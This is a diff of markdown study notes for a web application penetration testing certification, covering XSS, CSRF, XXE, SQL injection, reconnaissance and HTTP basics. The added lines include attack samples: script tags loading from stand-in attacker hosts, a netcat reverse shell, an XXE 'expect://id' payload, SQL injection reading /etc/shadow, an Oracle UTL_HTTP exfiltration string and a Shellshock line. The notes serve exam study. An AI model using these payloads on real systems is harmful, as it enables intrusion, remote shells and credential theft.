@@ -10,25 +10,18 @@
 
 ##### **Exam Topic Areas**
 
-1.     AJAX
+1. AJAX
+2. Automated Web Application Vulnerability Scanners
+3. Cross Site Scripting and Attack Frameworks
+4. Programming Fundamentals
+5. Reconnaissance
+6. Scanning and Mapping
+7. Session Tracking and SSL
+8. SQL Injection
+9. Understanding the Web and HTTP
+10. Web App Pen Test Methodology and Reporting
 
-2.     Automated Web Application Vulnerability Scanners
-
-3.     Cross Site Scripting and Attack Frameworks
-
-4.     Programming Fundamentals
-
-5.     Reconnaissance
-
-6.     Scanning and Mapping
-
-7.     Session Tracking and SSL
-
-8.     SQL Injection
-
-9.     Understanding the Web and HTTP
-
-10.  Web App Pen Test Methodology and Reporting
+------
 
 #### **AJAX**
 
@@ -36,9 +29,10 @@ Goal: The candidate will demonstrate an understanding of AJAX technology and its
 
 - Enables Web 2.0
 - Allows for more &#39;thick&#39; client type functionality
-- Popular feature of AJAX enabled site is &#39;[mash-ups&#39;](http://www.openajax.org/whitepapers/Ajax%20and%20Mashup%20Security.php#Mashups).
+- Popular feature of AJAX enabled site is &#39;[mash-ups&#39;](http://www.openajax.org/whitepapers/Ajax%20and%20Mashup%20Security.php#Mashups) (control URL used by proxy to access other sites or retrieve malicious JS to be used for XSS)
 
   - Same origin policy will cause issues for these type of sites
+    - origin host, destination port, protocol/scheme.
     - Solved by using proxy servers in between client browsers and backend applications
     - However, it creates security issue (attackers can use that proxy servers by manipulating parameters to perform various attacks)
       - Can be prevented by using check string on proxy server
@@ -53,7 +47,9 @@ Goal: The candidate will demonstrate an understanding of AJAX technology and its
 - Data format in AJAX based communications could be XML and JSON based
   - Client side JS code can load the JSON data into its memory
 
-#### **Automated Web Application Vulnerability Scanners**
+------
+
+#### Automated Web Application Vulnerability Scanners**
 
 Goal: The candidate will demonstrate familiarity with automated tools used to find web application vulnerabilities and their distinguishing features.
 
@@ -91,45 +87,103 @@ Goal: The candidate will demonstrate familiarity with automated tools used to fi
 
 - Burp Suite
   - Sniper – each position is completely fuzzed before next position starts
-  - Battering Ram – One payload is injected into all positions (in XSS test)
+  - Battering Ram – One payload is injected into all positions (in XSS test) (fuzzing all fields at once)
   - Pitchfork – Each position is fuzzed simultaneously
   - Cluster Bomb – Iterates through each position&#39;s payload
+  - Intruder - modify http requests parameters using 'Positions'
+  - Site map filters 4xx status codes - identifies open directories but doesn't report Forbidden or Not Found
 - ZAP
   - Spider – detect directories based on dictionary
+  - Wappalizer - uncovers technologies used on websites (OS, web server, DBs, languages).  Integrates with ZAP.
 
-#### **Cross Site Scripting and Attack Frameworks**
+------
+
+#### Cross Site Scripting and Attack Frameworks**
 
 Goal: The candidate will demonstrate an understanding of the types of XSS attacks and XSS attack frameworks that can be utilized during a pen test
 
 XSS
 
+- http response-splitting:  abillity to modify header, a bunch of \n's and the original is ignored.
+
+- If \<script\> is blacklisted, then you can use the DOM event handler to inject in onerror(), etc
+
 - Attack targets the browser and not the server; however impact could be on client or server side
+
+  - http://www.fire.com/page.asp?pageid=10&lang=en&Title<h1><script>1=1</script>
+
 - Same origin policy: Ensures client code runs for the associated application (determined by server, port and protocol)
+
 - Some sites use white-listing or black-listing or both to prevent XSS
+  
   - These may be bypassed using Unicode and hex encoding
+  
 - Types: Reflected, Stored / Persistent and DOM-based
+
+  - Reflected example:  http://www.GIAC.net/php/index.php?lang=de0utf-8&convcharset=iso-8859-1&collation_connection=utf8_unicode_ci
+
 - Tools: BurpSuite, ZAP, XSSer, XSSSniper, XSScrapy, TamperData
+
 - XSS Fuzzing: Reflection tests, Filter tests, POC payloads
   - [https://code.google.com/p/fuzzdb/source/browse/trunk/attack-payloads/xss/](https://code.google.com/p/fuzzdb/source/browse/trunk/attack-payloads/xss/)
   - [https://www.owasp.org/index.php/JBroFuzz](https://www.owasp.org/index.php/JBroFuzz)
+  
 - HTML injection; Image injection; Iframe injection;
+
 - Possible to read cookies, redirecting a user or run any external scripts
-  - \&lt;script src=&quot;http://evil.site/malicious.js&quot; \&gt;
-  - \&lt;img src=&quot;images/logo.gif&quot; onload=&quot;javascript:alert(document.cookie);&quot;;\&gt;
+  - <script src=&quot;http://evil.site/malicious.js" >
+  
+  - <img src=&quot;images/logo.gif&quot; onload=&quot;javascript:alert(document.cookie);">
+  
+- XSScrappy - checks if site is vulnerable
+
+  - payload is '"(){}<x>:; - if any rendered without escape, site is probably vulnerable
+  - could also be '"0=<x> or JaVAscRIPT:prompt(99)
+
+- test using a uniquely crafted value
+
+- same-origin policy used to control interactions from different servers (tabs)
+
+XXE
+
+```
+	POST http://example.com/xml HTTP/1.1
+
+​	<?xml version=1.0" encoding=ISO-8859-1"?>
+
+​	<!DOCTYPE doc1 [
+
+​		<!ELEMENT doc1 ANY >
+
+​		<!ENTITY ent1 SYSTEM "expect://id" >
+
+​	]>
+```
 
 CSRF
 
 - Leverages the trust the site has in the user (or user&#39;s browser) and uses predictable parameters
+
+  - http://www.earth.com/gui/?action=add-url&s=/http://evilsite.com/union.torrent
+
 - ZAP with API enabled generated an Anti-CSRF form to check the vulnerability
+
 - Four steps to test (manual):
   - Review app logic
   - Find sensitive page with predictable parameters
   - Create HTML page with the request
   - Access the page while logged in and check the function execution on application back-end
+  
 - Powerful exploitation tool: BeEF (PHP based app) (uses hook.js)
+  
+  - <script src="http://www.attackersite.com/evil.js"></script>
+  
   - Clipboard stealing, History Browsing, Port Scanning, Browser exploits, Inter-protocol exploitation
+  
 - Other tools: [https://code.google.com/p/monkeyfist/](https://code.google.com/p/monkeyfist/)[
 ](https://code.google.com/p/monkeyfist/)
+
+------
 
 #### **Programming Fundamentals**
 
@@ -151,32 +205,39 @@ AJAX
 
 JavaScript
 
-- \&lt;script\&gt;alert(&#39;JS&#39;)\&lt;/script\&gt;
+- Unnecessary functionality introduced with libraries and frameworks used
+
+- <script>alert(&#39;JS&#39;)</script>
+
 - var variable = &quot;string&quot;
+
 - Comments
   - /\* this is a multi-line comment \*/
   - // single line comment
+  
 - Switch / case exists in JavaScript
+
 - while(i\&lt;=100) { alert(i) i++ }
+
 - for(x=0;x\&lt;100;x++) { alert(x)  }
+
 - function method(a,b,c) { window.location= url }
+
 - Events: onload, onunload, onerror, onclick, onsubmit, onfocus, onblur, onchange, onmouseover
+
 - Object types: String, Date, Math, Window, Document, Location, History, Array
 
 Python
 
 - Used to write both web apps and client apps; Two versions: 3.x and 2.x series (incompatible)
 - Text = &quot;This is a sample text used for printing&quot;
-  
   - print Text
 - List = (&quot;data1&quot;, &quot;data2&quot;, &quot;data3&quot;)
-  
   - print List[0]
 - Dictionary = {&quot;key1&quot;:&quot;value1&quot; , &quot;key2&quot;:&quot;value2&quot; , &quot;key3&quot;:&quot;value3&quot;}
-  
   - print Dictionary ([&quot;key1&quot;])
 - Comments
-  - # this is a single-line comment
+  - \# this is a single-line comment
   - &quot;&quot;&quot; this is a multi-line comment with double-quotes &quot;&quot;&quot;
   - &#39;&#39;&#39; this is a multi-line comment with single-quotes &#39;&#39;&#39;
 - If Statement
@@ -190,7 +251,7 @@ Python
 - No switch / case in Python
 - While Statement
   - value = 0
-  - while value \&lt;= 100:
+  - while value <= 100:
     - URL = &quot;[https://www.example.com/pageID=](https://www.example.com/pageID=)&quot; + value
     - print URL
     - value++
@@ -221,7 +282,9 @@ Python
     - write
     - close(&#39;usernames.txt&#39;)
 
-#### **Reconnaissance**
+------
+
+#### Reconnaissance**
 
 Goal: The candidate will demonstrate comprehension of techniques used to conduct reconnaissance using available information.
 
@@ -230,11 +293,15 @@ Goal: The candidate will demonstrate comprehension of techniques used to conduct
 - Whois
   - Identifies owner of domain, contact info (phone, email and staff info) &amp; authoritative name servers
 - DNS Harvesting (UDP Port: 53)
+  - Always contacts hosts default DNS server first unless specified
   - DNS search (nslookup [interactive mode when no host is specified] and dig for Unix/Linux); dig options: A (ip), TXT, MX, NS
   - Fierce domain scanner: Finds hosts associated to the domain
-    - perl fierce.pl –dns \&lt;domain\&gt;
+    - perl fierce.pl –dns <domain>
   - DNSrecon: Performs enumeration of the target domain (Python based, Gets SRV records)
-  - DNS Zone transfer: host –la \&lt;domain\&gt;
+  - DNS Zone transfer: host –la <domain> .  Also known as DNS query type **AXFR**.  TCP port 53.  Used to replicate DNS databases across servers.  From primary to secondary.  Serial # used as version #.  Same serial, no change.  Secondaries for redundancy.
+    - dig @192.168.11.24 example.org -t AXFR
+    - Bind can limit zone transfers
+    - DNSSEC will require TCP to be open
 - Open Source Information: (LinkedIn, Google+, Facebook, Twitter, MySpace, Altavista, Google Code, etc.) &amp; Search engines (Google, Bing, DuckDuckGo, MSDN, Yahoo, Blogspot, etc.)
   - Info obtained even without connecting to the target
   - Google hacking techniques (search engine directives, applies to all search engines)
@@ -248,26 +315,31 @@ Goal: The candidate will demonstrate comprehension of techniques used to conduct
   - Metadata: Collects info based on metadata of the resources (Users, folders, printers, s/w, emails, OS, passwords and servers)
 - theHarvester, Maltego (relationship tools that maps, users, phones, emails, etc.)
 
-#### **Scanning and Mapping**
+------
+
+#### Scanning and Mapping**
 
 Goal: The candidate will demonstrate an understanding of mapping and scanning web applications and servers, including port scanning, identifying services and configurations, spidering, application flow charting and session analysis.
 
 - Recommended order of scanning:
   - Port scan (NMap): Connects to each open port and looks for banner (if none, returns &quot;nudge&quot;)
   - OS fingerprint &amp; version scan (NMap: -O detects OS and –sV detects service version and –A means both)
-- Netcraft toolbar (online based: gives webserver info, technology used, etc.)
+- Netcraft toolbar (online based: gives webserver info, technology used, OS, netblock owner, historical info)
 - Netcat to the application server may reveal _X-Powered-By_ and _Server_ info
   - Tool can also be used to obtain remote shell
 
-nc –lvvnp \&lt;random port\&gt; and do command injection using:
+```
+nc –lvvnp <random port> and do command injection using:
 
-nc \&lt;hacker ip\&gt; \&lt;random port\&gt; -e /bin/bash
+nc <hacker ip> <random port> -e /bin/bash
+```
 
 Tools
 
 - TestSSL (checks a server&#39;s service on any port for the support of TLS/SSL ciphers)
 - Fierce (DNS scan for IP addresses)
 - Nikto (Perl) or Yokoso (check for webserver / app server vulnerabilities)
+  - fingerprints using favicon.ico file
 - CeWL (builds custom word generator for use of password attacks)
 - wget  (dumps the website pages to local (including links with –r option))
 
@@ -289,21 +361,30 @@ Checks
   - May be useful for performing authorization bypass attacks
 - Load balancer analysis (Check for sticky sessions)
 - Software configuration analysis (including app server vulnerability checks)
-- Virtual hosting (SSL uses less number of IP addresses to service more websites)
+- Virtual hosting
+  - name based virtual hosting:  Multiple names, single IP
+  - IP based virtual hosting:  multiple IPs, single server
+
+------
 
 
-#### **Session Tracking and SSL**
+#### Session Tracking and SSL**
 
 Goal: The candidate will demonstrate comprehension of session tracking and SSL/TLS use in modern web communications as well as the attacks that can leverage flaws in session state
 
+- Cookie should have expiration, else it will be deleted when browser closes.
+  - Set-Cookie:  Session=xxx; domain=www.sec542.org; secure
 - Server side code uses some form of data stored on client side to track sessions
 - Session fixation - Could be available in a cookie, URL data, HTTP headers, hidden form fields, etc.
+  - Session ID should change after authentication - else it could be hijacked
 - Various session identifiers could be used for various resources of the same application, indicating different level of authorization required to access the resource
 - Can use Burp Sequencer to explore weaknesses of sessions
 - SSL relies on third-party certificate issuers called certificate authorities (CA)
 - Tools: Qualys SSL Labs, SSLScan, TestSSL, etc.
 
-#### **SQL Injection**
+------
+
+#### SQL Injection**
 
 Goal: The candidate will demonstrate an understanding of how to perform SQL injection attacks and how to identify SQL injection vulnerabilities in applications
 
@@ -319,14 +400,24 @@ Goal: The candidate will demonstrate an understanding of how to perform SQL inje
 
 - Uses _load\_file()_ function to read the file
   - &#39; union select load\_file(&#39;/etc/shadow&#39;),1 #
+- Uses information_schema table.processlist;
 - Uses _DUMPFILE_ or _OUTFILE_ to write data into the file
   - select \* from table into dumpfile &#39;/result.txt&#39;;
   - select \* from table into outfile &#39;/result.txt&#39;;
 
 Oracle
 
+- List all tables:  SELECT owner, table_name FROM all_tables;
+
 - Uses _utl\_file_ to read &amp; write data but has permissions (accessible paths) set in ora.ini config file
-- List all tables &quot; **SELECT**   **table\_name** , **ownerFROM** dba\_tables&quot;&quot;
+
+- List all tables &quot; **SELECT**  **table\_name , owner FROM** dba\_tables&quot;
+
+- ```sql
+  select a,b,null,null from table1      
+  union    
+  select null,null,c,d from table2 
+  ```
 
 MS SQL
 
@@ -353,6 +444,7 @@ PostGRES
 
 General
 
+- Example:  **http://www.wind.com/login.php?id=1%27%20waitfor%20delay%20%2700:00:15%27--**
 - File injection (remote and local) with SQLi
   - Local or remote file (makes use of file handling techniques mentioned above)
 - Prepared injection files (To obtain shell access of remote server)
@@ -361,11 +453,17 @@ General
   - ./sqlmap.py –u [http://www.example.com/app/file?key=value](http://www.example.com/app/file?key=value) --os-shell
   - Use this tool on all form fields, GET &amp; POST data, hidden links, AJAX / WebSocket, etc.
   - Options: --os-shell, --users, --passwords, --schema, --file-read=/etc/hosts
-- Blind SQL Injection: Results are not displayed to client (Benchmark() for MySQL and waitfor() for MS SQL sevrer)
+  - --priv-esc - increases privs of the DB
+  - integrates with Metasploit
+  - python based
+- Blind SQL Injection: Results are not displayed to client (Benchmark() for MySQL and waitfor() for MS SQL server)
+  - URL parameter:  **UTL_HTTP.request('remoteserver.com:80'||(SECECT user from DUAL)--**
   - Blind SQLi Tools: BBQSQL (binary &amp; frequency search), SQLMap à both tools in python
 
+------
 
-#### **Understanding the Web and HTTP**
+
+#### Understanding the Web and HTTP**
 
 Goal: The candidate will demonstrate an understanding of the fundamentals web applications and their architecture and a thorough comprehension of the HTTP protocol
 
@@ -375,8 +473,10 @@ Goal: The candidate will demonstrate an understanding of the fundamentals web ap
 - HTTP 1.0/1.1/2.0 (stateless in any version)
   - 0 uses binary protocol; based on Google SPDY; Push based; Multiplexed
 - HTTP methods: GET, POST, HEAD, TRACE, OPTIONS, _CONNECT, PUT, DELETE_
+- robots.txt file is always a good file to zero in on sensitive data
 - HTTP Request:
 
+```
 GET /resource HTTP 1.1
 
 HOST: www.sans.org
@@ -394,9 +494,13 @@ Proxy-connection: Keep-Alive
 Cookie: key=value
 
 Content-Length: 0
+```
+
+
 
 -  HTTP Response
 
+```
 HTTP/1.1 200 OK
 
 Content-type: text/html;
@@ -408,12 +512,13 @@ Server: Apache/2.2.3 (Redhat)
 Date: Tue, 01 May 2015 12:49:13 GMT
 
 Content-Length: 6243
+```
 
 - HTTP status codes:
   - 1xx – Informational (100=continue; 101=switching protocols; 102=Processing)
   - 2xx – Success (201=Created; 202=Accepted; 203=Non-Authz Info; 204=No Response; 206=Partial Content)
   - 3xx – Redirection (301=Moved Permanently; 302=Redirect / Found; 304=Not modified/loaded from browser cache; 306=switch proxy; 307=Temporary redirect; 308=Permanent redirect)
-  - 4xx – Client error (401=unauthorized; 403=Forbidden; 404=resource not found; 405=method not allow)
+  - 4xx – Client error (401=unauthorized; 403=Forbidden (hidden dir?); 404=resource not found; 405=method not allow)
   - 5xx – Server error (502=bad gateway; 503=service unavailable; 505=http version not supported; 598/599=network)
 - WebSocket: Adds support for bidirectional communications over a single TCP socket; typically found in .js files or in HTML using \&lt;script\&gt; block
 - Basic authentication:
@@ -421,6 +526,7 @@ Content-Length: 6243
   - Base64 encoded: 10 numbers, 26 small letters, 26 capital letters
   - Brute-force attack is possible; No Account lockout; Can be replayed
   - No logout available unless browser is closed manually
+  - reversibly encoded
 - Digest authentication:
   - HTTP status code is 401 / 403 to get the basic authentication pop-up on browser
   - Uses MD5 hash for passwords exchange; Uses nonce as salt;
@@ -436,13 +542,16 @@ Content-Length: 6243
   - HTTP status code is 200 even to get a login form;
   - Customized / app-dependent authentication mechanism
   - Requires a login form, processing code and defining protected resources
+    - Login form (enter auth), processing (authentication occurs), resources (user accessing)
   - Session management is as coded by developer
 - OAuth:
   - Doesn&#39;t actually authenticate but delegated it to third-parties
   - Has three party involved: user, consumer and service provider
   - Relies on trust between user and service provider
 
-#### **Web App Pen Test Methodology and Reporting**
+------
+
+#### Web App Pen Test Methodology and Reporting**
 
 Goal: The candidate will demonstrate comprehension of the typical methods and components used during a web application penetration test
 
@@ -480,7 +589,9 @@ Pen Tester Toolkit
   - Interception proxies (Burp, ZAP)
 - Hacker browser setup (remove client side security restrictions to perform attack)
 
-**Well Known Vulnerabilities**
+------
+
+#### *Well Known Vulnerabilities**
 
 Goal: List some of the well known vulnerabilities and what they do
 
@@ -490,19 +601,15 @@ Goal: List some of the well known vulnerabilities and what they do
   - Can test using: [https://github.com/sensepost/heartbleed-poc](https://github.com/sensepost/heartbleed-poc)
 - Shellshock:  Execute commands on vulnerable servers
   - () {:;}; /bin/cat /etc/passwd
+- side-channel attack
+  - uses physical information such as EMI, heat, and sound, to break a system
 - Path Traversal (../../../../) based attack
 - Encoding examples:
   - %2F%2E%2E - /..
+  - %27 - '
+  - %20 - space
+  - %3D - =
 - Directory browsing: ZAP or OWASP DirBuster or Google search (using hacking techniques)
 - Command Injection: Injecting data like ; &amp; |
 - Local File Inclusion (LFI) / Remote File Inclusion (RFI) (from perspective of application server) Can try PHP based RFI (shell\_exec) &amp; open backdoors
 
-
-
-
-
-Mine:
-
-DB types
-
-Nmap options
